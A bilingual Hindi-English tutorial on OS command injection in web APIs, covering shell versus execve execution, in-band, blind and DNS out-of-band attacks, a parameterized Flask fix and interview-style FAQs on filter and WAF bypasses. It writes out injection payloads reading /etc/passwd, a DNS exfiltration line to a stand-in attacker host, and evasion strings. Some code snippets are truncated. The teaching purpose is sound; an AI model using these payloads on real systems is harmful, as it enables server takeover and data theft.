10 Operating System Command Injection

OS Command Injection (RCE)

OS Command Injection tab hota hai jab backend API kisi user-controlled parameter (IP address, filename, domain) ko bina strict sanitization ke operating system shell (bash, sh, cmd.exe) me pass kar deti hai, jisse attacker shell separators (;, &&, |, $()) ke zariye arbitrary system binaries execute karke poore server ka root access le leta hai. OS Command Injection occurs when an API endpoint incorporates untrusted user data into operating system shell command strings without rigorous escaping or parameterized execution, permitting attackers to inject shell meta-characters (;, &&, |, $()) to execute arbitrary system binaries and achieve full Remote Code Execution (RCE).

Critical Remote Code Execution (CVSS 9.8) CWE-78 / OWASP API8:2023 ★ Shell Subprocess & System Execution

Rohan's Architecture Rule: "Developer ko lagta hai usne CLI command hide kar diya hai, lekin shell interpreter har semicolon ko naya command delimiter maanta hai! Kabhi bhi shell=True ya child_process.exec() me user input string format na karein." Rohan's Architecture Rule: "Developers assume underlying CLI commands are invisible, but shell interpreters parse every semicolon as a distinct statement delimiter! Never pass formatted user strings into shell=True or child_process.exec()."

Operating System Command Injection: Deep Architecture & Core Concepts Operating System Command Injection: Deep Architecture & Core Concepts

🖥️ Operating System Shell Kya Hota Hai Aur APIs Isse Kyu Invoke Karti Hain? What is an Operating System Shell & Why Do APIs Invoke It?
Modern API applications (jaise Python Flask, Node.js Express, Go Gin) Application Runtime Layer (User Space) par run hoti hain. Lekin unhe frequently host server ke low-level Operating System Layer (Kernel, File System, Network Interfaces) se kaam karwana padta hai—jaise network latency measure karna, media compress karna, PDF invoices render karna, ya hardware status check karna.

Jab API code operating system se interact karne ke liye ek intermediate Command Shell (jaise Linux me /bin/sh ya /bin/bash, aur Windows me cmd.exe ya powershell.exe) ko call karta hai, toh ek fatal boundary cross hoti hai. Agar API user-supplied data (jaise hostname, filename, ya IP) ko bina isolate kiye raw command string me interpolate kar deti hai, toh shell interpreter metacharacters (jaise ;, &&, |) ko execution instructions maan leti hai. Yahi OS Command Injection (RCE) kehlata hai—jahan ek ordinary HTTP API request server ke root console me transform ho jati hai! Modern API microservices operate within the Application Runtime Layer (User Space). However, workflows frequently demand low-level interactions with the host Operating System Layer (Kernel, File System, Network Sockets)—such as evaluating network packet latency, encoding video streams, generating PDF invoices, or querying hardware health.

A catastrophic architectural flaw occurs when backend code spawns an intermediate Command Shell (such as /bin/sh or /bin/bash in Linux, or cmd.exe / powershell.exe in Windows) and injects unvalidated user parameters directly into raw command strings. The shell's lexical analyzer parses command delimiters (e.g., ;, &&, |, $()) as execution boundaries, executing attacker-supplied payloads with the server process's operational privileges. This is Remote Code Execution (RCE).
1. System Binaries & CLI Tools
OS ke compiled executables (/bin/ping, /usr/bin/ffmpeg) jo disk par stored hote hain aur specific tasks perform karte hain. Standalone compiled executables (/bin/ping, /usr/bin/ffmpeg) existing in filesystem paths to execute dedicated tasks.
2. Shell Command Interpreters
Program (/bin/sh) jo input text strings ko parse karta hai, operators tokenize karta hai aur child processes launch karta hai. Programs (/bin/sh) that parse text strings, evaluate metacharacters, split tokens, and chain processes.
3. Kernel System Calls
Low-level OS interfaces (fork(), execve(), clone()) jinke zariye new execution context create aur run hota hai. Kernel primitives (fork(), execve()) that initialize memory spaces and spawn independent process contexts.
4. Privilege Context (UID/GID)
Injected command usi Linux user account (e.g. root ya www-data) ki file aur network permissions inherit karti hai. The injected command inherits the effective User ID (UID) and file system permissions of the parent web server process.

Operating system shells kisi bhi string ko seedha execute nahi karti. Wo pehle text ko lexical analysis (tokenization) ke zariye break karti hain, operators dhundti hain, aur kernel syscalls trigger karti hain. Niche iska end-to-end architectural lifecycle aur deep process breakdown explain kiya gaya hai: Operating system shells never execute raw strings directly without tokenization. They tokenize command lines, evaluate control metacharacters, split arguments, and dispatch low-level kernel syscalls. Examine the end-to-end execution lifecycle below:

⚡ Kernel Syscall Mechanics: POSIX system() vs execve() Kernel Syscall Mechanics: POSIX system() vs execve()
Command Injection ki poori vulnerability C runtime library aur Linux kernel ke do contrasting execution primitives ke beech ka farq samajhne se clear ho jati hai: The entire vulnerability hinges upon the fundamental architectural contrast between two low-level C runtime execution primitives:
❌ Vulnerable: C system() / shell=True
Jab backend system("ping " + host) ya subprocess.Popen(..., shell=True) call karta hai, OS kernel seedha ping ko nahi chalata! Wo pehle ek Shell Interpreter process spawn karta hai:
/bin/sh -c "ping -c 2 8.8.8.8; whoami" Shell ka lexer string ko tokenize karta hai. Semicolon ko command terminator maan kar do alag-alag commands execute kar deta hai! When invoking system("ping " + host) or subprocess.Popen(..., shell=True), the kernel does NOT spawn the binary directly! It spawns an intermediate shell process:
/bin/sh -c "ping -c 2 8.8.8.8; whoami" The shell lexer evaluates semicolons as statement delimiters, spawning arbitrary secondary commands.
✅ Immune: Kernel execve() / shell=False
Jab backend subprocess.run(['ping', '-c', '2', host], shell=False) call karta hai, C standard library direct Linux kernel syscall invoke karti hai:
execve("/bin/ping", ["ping", "-c", "2", "8.8.8.8; whoami"], envp) Yahan koi shell exist hi nahi karta! Poora string "8.8.8.8; whoami" ek single isolated argument banta hai. Ping utility DNS lookup fail karegi, lekin zero command execute hogi! When passing an argument vector without a shell (shell=False), the runtime issues the POSIX kernel system call directly:
execve("/bin/ping", ["ping", "-c", "2", "8.8.8.8; whoami"], envp) No intermediate shell exists! The entire string is treated as a single parameter element. Ping reports an invalid hostname, completely neutralizing execution!

🔬 The 3 Core Exploit Paradigms: In-Band, Blind & Out-of-Band (OOB) The 3 Core Exploit Paradigms: In-Band, Blind & Out-of-Band (OOB)
1️⃣ Type A: In-Band (Result-Based) Command Injection
Isme application standard output (stdout) ya standard error (stderr) ko seedha HTTP response me return kar deti hai. Attacker POST /api/v1/ping bhejta hai with 8.8.8.8; cat /etc/passwd, aur API response me server ke users ki list direct browser me aa jati hai. Yeh sabse direct aur dangerous category hai. Occurs when the application captures standard output (stdout) or standard error (stderr) streams from the executed subprocess and serializes it directly into the HTTP response body. Attackers immediately view command outputs within their HTTP client.
2️⃣ Type B: Blind (Time-Based) Command Injection
Jab API response me sirf generic success message (e.g. {"status": "queued"}) deti hai aur CLI output suppress kar leti hai, tab attacker Time Delay inject karta hai: ; sleep 10. Agar server request ka response exact 10 seconds delay karke lautata hai, toh vulnerability confirm ho jati hai. Attacker conditional sleep use karke bit-by-bit poora database ya password extract kar sakta hai! When the API suppresses standard streams or returns static status payloads (e.g., {"status": "queued"}), direct observation is impossible. Attackers inject time delay primitives: ; sleep 10. If HTTP response latency increases by precisely 10 seconds, command execution is proven. Data is then exfiltrated bit-by-bit using timing thresholds.
3️⃣ Type C: Out-of-Band (OOB / DNS Exfiltration)
Agar inbound HTTP traffic me response delay measure karna possible na ho (e.g. asynchronous celery workers), toh attacker Out-of-Band DNS Queries trigger karta hai: ; nslookup $(whoami).attacker-server.com. Backend server command execute karega, whoami resolve karega (e.g. root), aur attacker ke authoritative DNS server par root.attacker-server.com ki lookup query send karega! Attacker apne DNS logs me data read kar leta hai! If backend execution is fully decoupled from the HTTP response pipeline (e.g. async Celery workers), attackers trigger outbound network interactions. Injecting ; nslookup $(whoami).attacker-server.com forces the host resolver to query the adversary's authoritative nameserver, exfiltrating the username in the requested subdomain!

Code & Fix: Secure Architecture & Parameterization Patterns Code & Fix: Secure Architecture & Parameterization Patterns

Command injection ko eliminate karne ka sabse prabhavi tareeqa hai ki command strings ko shell interpreter ke bina direct argument vector ke roop me execute kiya jaye: The most effective defense against command injection is completely bypassing shell interpreters by invoking binaries with immutable argument arrays:

❌ Vulnerable: shell=True String Concatenation 
# ❌ VULNERABLE: Invokes shell, interprets metacharacters
from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route("/api/v1/diagnostics/ping", methods=["POST"])
def ping_diagnostics():

    host = data.get("host", "")

    # CRITICAL FLAW: shell=True passes string directly to /bin/sh

✅ Secure: shell=False + Argument Array + IP Validation 
# ✅ SECURE: Strict validation + direct binary execution
from flask import Flask, request, jsonify
import subprocess
import ipaddress

app = Flask(__name__)

@app.route("/api/v1/diagnostics/ping", methods=["POST"])
def ping_diagnostics():
    data = request.get_json() or {}
    host = str(data.get("host", "")).strip()

    # 1. Strict Allowlist: Validate IPv4 syntax before execution
    try:
        ip_obj = ipaddress.IPv4Address(host)
        clean_ip = str(ip_obj)
    except ValueError:
        return jsonify({
            "error": "Validation Error: 'host' must be a valid IPv4 address",
            "code": "INVALID_PARAMETER_SYNTAX"
        }), 400

    # 2. Direct execution: shell=False + immutable argument vector
    # Shell metacharacters (; && | `) are passed as literal text
    res = subprocess.run(
        ["/bin/ping", "-c", "2", clean_ip],
        shell=False,
        capture_output=True,
        text=True,
        timeout=5,
        check=False
    )

    return jsonify({"status": "success", "output": res.stdout}), 200

  // 2. execFile invokes binary directly (bypasses /bin/sh)
  // Argument array elements cannot inject new commands
  execFile('/bin/ping', ['-c', '2', host], { timeout: 5000 }, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: stderr || error.message });
    }
    return res.json({ status: 'success', output: stdout });
  });
});

Frequently Asked Questions (FAQ) Frequently Asked Questions (FAQ)

Top Security Engineer & Pentester interview questions on OS Command Injection mechanics, bypasses, and secure architecture: High-yield technical and interview questions covering Command Injection mechanics, shell evaluation, and production hardening:

Q1: Agar space character block ho toh attacker commands kaise separate karta hai? Q1: How do attackers bypass whitespace restrictions when space is filtered?

Answer: Linux shells me space ke kai built-in alternatives hote hain: (1) ${IFS} (Internal Field Separator jo by default space, tab, newline represent karta hai), (2) Redirection syntax cat</etc/passwd, (3) Brace expansion {cat,/etc/passwd}, aur (4) URL-encoded tabs (%09) ya newlines (%0a). Isliye space filter karna bilkul bekaar defense hai. Answer: Unix shells provide multiple whitespace substitutes: (1) ${IFS} (Internal Field Separator default to space/tab/newline), (2) Redirection operators cat</etc/passwd, (3) Brace expansion {cat,/etc/passwd}, and (4) URL-encoded tabs (%09) or newlines (%0a). This is why filtering spaces provides zero security against seasoned attackers.

Q2: Command Injection aur Code Injection (SSTI / eval) me kya fundamental difference hai? Q2: What is the fundamental difference between Command Injection and Code Injection?

Answer: Code Injection application programming language runtime ke andar execute hota hai (jaise Python me eval(), Node.js me vm.runInContext, ya template engine me SSTI). Jabki Command Injection operating system process shell (bash, sh, cmd.exe) me arbitrary system binaries aur utility commands execute karta hai. Answer: Code Injection executes within the application programming language runtime (such as Python's eval() or Node's vm). In contrast, Command Injection executes within the operating system shell (bash, sh, cmd.exe), invoking external host processes and system binaries.

Q3: Kya WAF (Web Application Firewall) Command Injection se 100% protect kar sakta hai? Q3: Can a Web Application Firewall (WAF) reliably prevent Command Injection?

Answer: Bilkul nahi! Attackers WAF signatures ko bypass karne ke liye environment variable slicing ($PATH se characters lena jaise ${PATH:0:1} for /), wildcards (/???/??? /???/??ss?? for /bin/cat /etc/passwd), aur variable concatenation (w'h'o'a'm'i ya $u$n$a$m$e) use karte hain jise regex WAFs detect nahi kar pate. Real fix code level par parameterized execution hai. Answer: No. Adversaries routinely evade WAF signature rules via environment variable slicing (${PATH:0:1} for /), wildcard globbing (/???/??? /???/??ss??), and quote concatenation (w'h'o'a'm'i). WAFs serve only as secondary defense-in-depth; root remediation requires parameterized execution without shells.

Q4: Containerized environment (Docker/K8s) me Command Injection kitna khatarnak hota hai? Q4: How severe is Command Injection inside containerized environments (Docker/K8s)?

Answer: Yeh extremely dangerous hota hai! Agar container root user ke roop me chal raha hai aur Docker socket (/var/run/docker.sock) ya Kubernetes Service Account token (/run/secrets/kubernetes.io/serviceaccount/token) mounted hai, toh attacker pod se break out karke poore Kubernetes cluster ka administrative takeover kar sakta hai. Answer: Catastrophic. If the container runs as root with mounted Docker sockets (/var/run/docker.sock) or Kubernetes Service Account tokens (/run/secrets/kubernetes.io/serviceaccount/token), adversaries can perform container escapes, compromise worker nodes, and seize administrative cluster control.
